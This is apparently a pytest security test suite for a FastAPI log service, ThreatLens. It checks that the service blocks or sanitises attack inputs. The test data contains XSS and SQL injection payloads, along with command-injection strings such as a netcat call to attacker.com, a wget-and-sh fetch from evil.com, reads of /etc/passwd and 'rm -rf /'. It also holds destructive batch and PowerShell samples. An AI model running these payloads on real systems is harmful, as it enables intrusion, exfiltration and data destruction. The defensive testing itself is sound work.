"""
Attack prevention tests for ThreatLens.

Tests various attack vectors and ensures they are properly blocked
or mitigated by the security measures.
"""
import pytest
import time
import json
import base64
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
from io import BytesIO

from main import app

client = TestClient(app)


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""
    
    def test_xss_in_log_content_sanitized(self):
        """Test that XSS payloads in log content are sanitized."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')></iframe>"
        ]
        
        for payload in xss_payloads:
            log_data = {
                "content": f"Normal log entry\n{payload}\nAnother entry",
                "source": "xss_test"
            }
            
            response = client.post("/ingest-log", json=log_data)
            assert response.status_code == 200, f"Failed for payload: {payload}"
            
            # The payload should be sanitized (we can't easily verify this without
            # checking the database, but the request should succeed)
    
    def test_xss_in_query_parameters_blocked(self):
        """Test that XSS in query parameters is blocked."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            response = client.get(f"/events?category={payload}")
            assert response.status_code == 400, f"XSS payload not blocked: {payload}"
            assert "invalid characters" in response.json()["detail"].lower()


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""
    
    def test_sql_injection_in_filters_blocked(self):
        """Test that SQL injection in filter parameters is handled."""
        sql_payloads = [
            "'; DROP TABLE events; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; DELETE FROM events; --",
            "' OR 1=1 --"
        ]
        
        for payload in sql_payloads:
            # Test in various filter parameters
            response = client.get(f"/events?category={payload}")
            # Should either be blocked by input validation or handled safely by ORM
            assert response.status_code in [200, 400], f"Unexpected response for: {payload}"
            
            response = client.get(f"/events?source={payload}")
            assert response.status_code in [200, 400], f"Unexpected response for: {payload}"
    
    def test_sql_injection_in_log_content_sanitized(self):
        """Test that SQL injection patterns in log content are sanitized."""
        sql_payloads = [
            "'; DROP TABLE logs; --",
            "' OR '1'='1",
            "UNION SELECT password FROM users",
            "'; DELETE FROM events WHERE 1=1; --"
        ]
        
        for payload in sql_payloads:
            log_data = {
                "content": f"Log entry with SQL: {payload}",
                "source": "sql_test"
            }
            
            response = client.post("/ingest-log", json=log_data)
            assert response.status_code == 200, f"Failed for SQL payload: {payload}"


class TestCommandInjectionPrevention:
    """Test command injection prevention."""
    
    def test_command_injection_in_log_content_sanitized(self):
        """Test that command injection patterns are sanitized."""
        cmd_payloads = [
            "; rm -rf /",
            "$(malicious_command)",
            "`rm -rf /`",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "; wget http://evil.com/malware.sh | sh"
        ]
        
        for payload in cmd_payloads:
            log_data = {
                "content": f"Log entry: {payload}",
                "source": "cmd_test"
            }
            
            response = client.post("/ingest-log", json=log_data)
            assert response.status_code == 200, f"Failed for command payload: {payload}"
    
    def test_command_injection_in_source_sanitized(self):
        """Test that command injection in source field is sanitized."""
        cmd_payloads = [
            "; rm -rf /",
            "$(malicious_command)",
            "`rm -rf /`"
        ]
        
        for payload in cmd_payloads:
            log_data = {
                "content": "Normal log content",
                "source": f"source{payload}"
            }
            
            response = client.post("/ingest-log", json=log_data)
            assert response.status_code == 200, f"Failed for command payload in source: {payload}"


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""
    
    def test_path_traversal_in_filename(self):
        """Test that path traversal in filenames is prevented."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        log_content = b"Valid log content for testing"
        
        for payload in traversal_payloads:
            files = {"file": (payload, BytesIO(log_content), "text/plain")}
            response = client.post("/ingest-log", files=files)
            
            # Should succeed but filename should be sanitized
            assert response.status_code == 200, f"Failed for traversal payload: {payload}"


class TestFileUploadAttacks:
    """Test file upload attack prevention."""
    
    def test_executable_file_upload_blocked(self):
        """Test that executable files are blocked."""
        executable_types = [
            ("malware.exe", b'\x4d\x5a\x90\x00' + b'A' * 100),  # PE executable
            ("malware.elf", b'\x7f\x45\x4c\x46' + b'A' * 100),  # ELF executable
            ("malware.jar", b'\x50\x4b\x03\x04' + b'A' * 100),  # JAR file
            ("script.bat", b"@echo off\ndel /f /q C:\\*.*"),      # Batch script
            ("script.sh", b"#!/bin/bash\nrm -rf /"),             # Shell script
            ("script.ps1", b"Remove-Item -Recurse -Force C:\\")  # PowerShell
        ]
        
        for filename, content in executable_types:
            files = {"file": (filename, BytesIO(content), "application/octet-stream")}
            response = client.post("/ingest-log", files=files)
            
            assert response.status_code == 400, f"Executable file not blocked: {filename}"
            assert "not allowed" in response.json()["detail"].lower()
    
    def test_oversized_file_upload_blocked(self):
        """Test that oversized files are blocked."""
        # Create a file larger than the limit (10MB)
        large_content = b'A' * (11 * 1024 * 1024)  # 11MB
        
        files = {"file": ("large.log", BytesIO(large_content), "text/plain")}
        response = client.post("/ingest-log", files=files)
        
        assert response.status_code == 400
        assert "too large" in response.json()["detail"].lower()
    
    def test_zip_bomb_protection(self):
        """Test protection against zip bombs and compressed files."""
        # Simulate a ZIP file signature
        zip_content = b'\x50\x4b\x03\x04' + b'A' * 100
        
        files = {"file": ("archive.zip", BytesIO(zip_content), "application/zip")}
        response = client.post("/ingest-log", files=files)
        
        assert response.status_code == 400
        assert "not allowed" in response.json()["detail"].lower()


class TestDenialOfServicePrevention:
    """Test Denial of Service (DoS) attack prevention."""
    
    def test_request_size_limit(self):
        """Test that oversized requests are blocked."""
        # Create a very large JSON payload
        large_data = {
            "content": "A" * (10 * 1024 * 1024),  # 10MB string
            "source": "dos_test"
        }
        
        response = client.post("/ingest-log", json=large_data)
        # Should be blocked by request size validation
        assert response.status_code in [413, 422, 400]
    
    def test_deeply_nested_json_handled(self):
        """Test that deeply nested JSON doesn't cause issues."""
        # Create deeply nested JSON
        nested_data = {"content": "test", "source": "nested_test"}
        for i in range(100):  # Create 100 levels of nesting
            nested_data = {"nested": nested_data}
        
        response = client.post("/ingest-log", json=nested_data)
        # Should be handled gracefully (validation error expected)
        assert response.status_code in [422, 400]
    
    @pytest.mark.slow
    def test_rate_limiting_prevents_dos(self):
        """Test that rate limiting prevents DoS attacks."""
        # Make many rapid requests
        blocked_count = 0
        for i in range(200):
            response = client.get("/health")
            if response.status_code == 429:
                blocked_count += 1
        
        # Should have blocked some requests
        assert blocked_count > 0, "Rate limiting not working"


class TestHeaderInjection:
    """Test HTTP header injection prevention."""
    
    def test_header_injection_in_user_agent(self):
        """Test that header injection in User-Agent is handled."""
        malicious_headers = {
            "User-Agent": "Mozilla/5.0\r\nX-Injected-Header: malicious\r\nAnother-Header: value"
        }
        
        response = client.get("/health", headers=malicious_headers)
        # Should not crash and should not include injected headers
        assert response.status_code == 200
        assert "X-Injected-Header" not in response.headers
    
    def test_header_injection_in_referer(self):
        """Test that header injection in Referer is handled."""
        malicious_headers = {
            "Referer": "http://example.com\r\nX-Injected: malicious"
        }
        
        response = client.get("/health", headers=malicious_headers)
        assert response.status_code == 200


class TestCSRFPrevention:
    """Test Cross-Site Request Forgery (CSRF) prevention."""
    
    def test_cors_configuration(self):
        """Test that CORS is properly configured."""
        # Test preflight request
        headers = {
            "Origin": "http://malicious-site.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type"
        }
        
        response = client.options("/ingest-log", headers=headers)
        
        # Should either block or allow based on CORS policy
        # In our case, we allow localhost origins only
        allowed_origin = response.headers.get("access-control-allow-origin")
        if allowed_origin and allowed_origin != "*":
            assert "localhost" in allowed_origin or "127.0.0.1" in allowed_origin


class TestInformationDisclosure:
    """Test prevention of information disclosure."""
    
    def test_error_messages_dont_leak_info(self):
        """Test that error messages don't leak sensitive information."""
        # Try to access non-existent event
        response = client.get("/event/non-existent-id")
        assert response.status_code == 404
        
        error_detail = response.json()["detail"]
        # Should not leak database schema or internal paths
        assert "table" not in error_detail.lower()
        assert "column" not in error_detail.lower()
        assert "/app/" not in error_detail
        assert "traceback" not in error_detail.lower()
    
    def test_server_header_obfuscation(self):
        """Test that server information is obfuscated."""
        response = client.get("/health")
        server_header = response.headers.get("server", "")
        
        # Should not reveal underlying technology stack
        sensitive_info = ["uvicorn", "python", "fastapi", "gunicorn"]
        for info in sensitive_info:
            assert info not in server_header.lower()
    
    def test_debug_info_not_exposed(self):
        """Test that debug information is not exposed."""
        # Try to trigger an error
        response = client.get("/events?page=-1")
        
        if response.status_code >= 400:
            error_response = response.json()
            # Should not contain debug information
            assert "traceback" not in str(error_response).lower()
            assert "file" not in str(error_response).lower()
            assert "line" not in str(error_response).lower()


class TestEncodingAttacks:
    """Test various encoding-based attacks."""
    
    def test_unicode_normalization_attacks(self):
        """Test that Unicode normalization attacks are handled."""
        # Unicode characters that might bypass filters
        unicode_payloads = [
            "＜script＞alert('xss')＜/script＞",  # Full-width characters
            "<script>alert('xss')</script>",      # Normal script
            "\\u003cscript\\u003ealert('xss')\\u003c/script\\u003e"  # Unicode escapes
        ]
        
        for payload in unicode_payloads:
            log_data = {
                "content": f"Log with unicode: {payload}",
                "source": "unicode_test"
            }
            
            response = client.post("/ingest-log", json=log_data)
            assert response.status_code == 200, f"Failed for Unicode payload: {payload}"
    
    def test_base64_encoded_attacks(self):
        """Test that Base64 encoded attacks are handled."""
        # Base64 encoded script tag
        script_b64 = base64.b64encode(b"<script>alert('xss')</script>").decode()
        
        log_data = {
            "content": f"Log with base64: {script_b64}",
            "source": "base64_test"
        }
        
        response = client.post("/ingest-log", json=log_data)
        assert response.status_code == 200
    
    def test_url_encoded_attacks(self):
        """Test that URL encoded attacks are handled."""
        # URL encoded script tag
        url_encoded = "%3Cscript%3Ealert('xss')%3C/script%3E"
        
        response = client.get(f"/events?category={url_encoded}")
        # Should be blocked by input validation
        assert response.status_code == 400


class TestBusinessLogicAttacks:
    """Test attacks against business logic."""
    
    def test_negative_pagination_values(self):
        """Test that negative pagination values are handled."""
        response = client.get("/events?page=-1&per_page=-10")
        # Should return validation error
        assert response.status_code == 422
    
    def test_extreme_pagination_values(self):
        """Test that extreme pagination values are handled."""
        response = client.get("/events?page=999999&per_page=999999")
        # Should be handled gracefully
        assert response.status_code in [200, 422, 400]
    
    def test_invalid_date_ranges(self):
        """Test that invalid date ranges are handled."""
        response = client.get("/events?start_date=2025-12-31&end_date=2020-01-01")
        # Should return validation error for invalid date range
        assert response.status_code == 400
        assert "start_date cannot be after end_date" in response.json()["detail"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])